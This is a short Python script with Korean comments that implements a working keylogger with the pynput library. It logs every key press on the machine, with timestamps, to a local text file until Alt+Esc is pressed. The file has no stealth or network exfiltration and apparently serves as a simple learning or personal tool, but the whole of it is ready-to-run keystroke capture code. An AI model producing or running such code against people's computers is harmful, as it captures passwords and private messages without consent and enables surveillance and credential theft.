from pynput import keyboard
import sys
import logging


def key_logger():
    #  로그 설정
    logging.basicConfig(
        filename='Desktop\keylogger\Log.txt', # 로그 파일 경로로 바꾸세요!!!!!!!!!
        level=logging.INFO,
        format='%(asctime)s  -  %(message)s',
        datefmt='%Y.%m.%d %H:%M:%S'
    )

    # 종료 커맨드 : Alt + Esc
    exit_command = [{keyboard.Key.alt_l, keyboard.Key.esc},
                    {keyboard.Key.alt_r, keyboard.Key.esc},
                    {keyboard.Key.alt, keyboard.Key.esc}]

    # 현재 누르고 있는 종료 커맨드 modifier
    current = set()

    def press_key(key):
        logging.info("{0} pressed.".format(key))

        if any([key in COMBO for COMBO in exit_command]):
            current.add(key)

            # exit command 누를 시 키로거 종료
            if any(all(k in current for k in COMBO) for COMBO in exit_command):
                logging.info("---------- Keylogging End ----------")
                listener.stop()
                sys.exit(0)

    def release_key(key):
        if any([key in COMBO for COMBO in exit_command]):
            current.remove(key)

        if key in (keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l):
            logging.info("{0} released.".format(key))

    # 키로깅 실행
    with keyboard.Listener(on_press=press_key, on_release=release_key) as listener:
        logging.info("---------- Keylogging Start ----------")
        listener.join()


if __name__ == '__main__':

    # 키로거 실행
    key_logger()